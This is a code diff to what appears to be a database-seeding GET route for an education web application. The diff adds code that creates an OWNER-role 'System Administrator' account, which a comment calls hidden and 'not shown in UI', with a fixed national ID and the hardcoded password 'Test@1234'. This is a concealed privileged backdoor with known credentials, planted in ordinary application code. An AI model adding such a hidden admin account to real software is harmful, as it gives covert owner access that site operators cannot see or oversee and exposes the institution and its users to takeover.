@@ -124,9 +124,23 @@ export async function GET(request: Request) {
       throw new Error('Required roles not found');
     }
 
-    // Create Super Admin
-    console.log('👨‍💼 Creating super admin...');
+    // Create hidden system admin (OWNER) - not shown in UI
+    console.log('👨‍💼 Creating system administrators...');
     const hashedPassword = await bcrypt.hash('Test@1234', 10);
+    
+    // System Admin (OWNER) - Hidden account
+    const systemAdmin = await User.create({
+      nationalId: '0000000000',
+      password: hashedPassword,
+      fullName: 'System Administrator',
+      email: 'system@anjal.edu.sa',
+      phone: '+966500000000',
+      roleId: ownerRole._id,
+      isActive: true,
+    });
+    console.log('✅ System admin created (hidden)');
+
+    // Super Admin - Main admin account
     const superAdmin = await User.create({
       nationalId: '1111111111',
       password: hashedPassword,
